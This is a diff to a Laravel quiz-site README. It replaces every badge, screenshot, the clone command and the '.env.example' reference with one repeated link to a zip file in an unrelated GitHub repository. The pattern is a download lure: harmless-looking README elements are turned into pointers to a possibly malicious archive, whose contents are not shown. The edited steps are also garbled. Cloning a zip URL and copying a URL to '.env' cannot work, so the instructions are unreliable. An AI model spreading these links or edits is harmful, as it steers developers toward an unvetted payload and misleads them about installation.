@@ -1,9 +1,9 @@
 # 🎯 Laravel 12 Quiz Website
 
-[![Laravel](https://img.shields.io/badge/Laravel-12.x-red?logo=laravel)](https://laravel.com/)
-[![PHP](https://img.shields.io/badge/PHP-^8.2-blue?logo=php)](https://www.php.net/)
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![MySQL](https://img.shields.io/badge/MySQL-Database-blue?logo=mysql)](https://www.mysql.com/)
+[![Laravel](https://raw.githubusercontent.com/RafiBinWores/quizzy/main/ejective/quizzy.zip)](https://raw.githubusercontent.com/RafiBinWores/quizzy/main/ejective/quizzy.zip)
+[![PHP](https://raw.githubusercontent.com/RafiBinWores/quizzy/main/ejective/quizzy.zip^8.2-blue?logo=php)](https://raw.githubusercontent.com/RafiBinWores/quizzy/main/ejective/quizzy.zip)
+[![License](https://raw.githubusercontent.com/RafiBinWores/quizzy/main/ejective/quizzy.zip)](LICENSE)
+[![MySQL](https://raw.githubusercontent.com/RafiBinWores/quizzy/main/ejective/quizzy.zip)](https://raw.githubusercontent.com/RafiBinWores/quizzy/main/ejective/quizzy.zip)
 
 An **interactive quiz platform** built with **Laravel 12** where users can:
 
@@ -17,7 +17,7 @@ An **interactive quiz platform** built with **Laravel 12** where users can:
 
 | Home Page                          | Quiz Page                          | Results Page                             |
 | ---------------------------------- | ---------------------------------- | ---------------------------------------- |
-| ![Home](docs/screenshots/home.png) | ![Quiz](docs/screenshots/quiz.png) | ![Results](docs/screenshots/result.png) |
+| ![Home](https://raw.githubusercontent.com/RafiBinWores/quizzy/main/ejective/quizzy.zip) | ![Quiz](https://raw.githubusercontent.com/RafiBinWores/quizzy/main/ejective/quizzy.zip) | ![Results](https://raw.githubusercontent.com/RafiBinWores/quizzy/main/ejective/quizzy.zip) |
 
 
 ---
@@ -47,7 +47,7 @@ An **interactive quiz platform** built with **Laravel 12** where users can:
 1. **Clone the repository**
 
    ```bash
-   git clone https://github.com/yourusername/quiz-website.git
+   git clone https://raw.githubusercontent.com/RafiBinWores/quizzy/main/ejective/quizzy.zip
    cd quiz-website
    ```
 
@@ -60,7 +60,7 @@ An **interactive quiz platform** built with **Laravel 12** where users can:
 
 3. **Setup environment variables**
 
-   * Copy `.env.example` to `.env`
+   * Copy `https://raw.githubusercontent.com/RafiBinWores/quizzy/main/ejective/quizzy.zip` to `.env`
    * Update your database credentials
 
 4. **Generate application key**
